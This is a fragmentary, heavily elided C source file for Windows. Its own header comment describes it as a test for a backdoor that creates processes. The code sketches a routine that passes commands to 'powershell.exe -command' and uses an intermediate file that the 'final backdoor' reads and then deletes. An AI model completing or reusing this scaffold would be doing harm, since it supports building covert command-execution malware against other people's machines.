// INFO: this is a test for backdoor to create processes
//
#include <stdio.h>
#include <strsafe.h>
#include <tchar.h>
...
void CreateChildProcess(LPSTR cmd);
...
int _tmain(int argc, TCHAR *argv[]) {
  ...
  g_hInputFile =
      CreateFile(".\\hellothere.txt", FILE_GENERIC_WRITE | GENERIC_READ, 0,
  ...
  //
  // delete the middle file that is read from in final backdoor
...
// STDOUT.
{
  ...
  snprintf(buffer, sizeof(buffer), "powershell.exe -command \"%s\"", cmd);
